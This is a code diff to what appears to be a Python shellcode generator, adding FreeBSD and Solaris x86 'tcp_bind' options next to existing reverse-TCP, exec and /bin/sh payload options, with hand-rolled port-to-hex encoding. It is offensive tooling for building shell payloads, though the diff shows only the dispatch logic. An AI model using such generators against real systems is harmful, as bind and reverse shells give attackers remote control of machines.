@@ -164,6 +164,14 @@ def generator( choose, shellcode, argv="None", argv2="None"):
 			from database.stackconvert import PORT
 			return reverse_tcp2( IP(argv2), PORT(argv))
 		
+		elif shellcode == "tcp_bind":
+			from FreeBSDx86.tcp_bind import tcp_bind
+			if len(str(argv)) == 5:
+				PORT = "\\x%s\\x%s" % (hex(int(argv))[2:][0:2],hex(int(argv))[2:][2:])
+			else:
+				PORT = "\\x%s\\x%s" % ("0"+hex(int(argv))[2:][0],hex(int(argv))[2:][1:])
+			return tcp_bind( PORT)
+
 		elif shellcode == "exec":
 			from FreeBSDx86.execc import execc
 			from database.plaintext import plaintext
@@ -264,3 +272,7 @@ def generator( choose, shellcode, argv="None", argv2="None"):
 		elif shellcode == "bin_sh":
 			from Solarisx86.bin_sh import bin_sh
 			return bin_sh()
+		elif shellcode == "tcp_bind":
+			from Solarisx86.tcp_bind import tcp_bind
+			from database.stackconvert import PORT
+			return tcp_bind( PORT(argv))
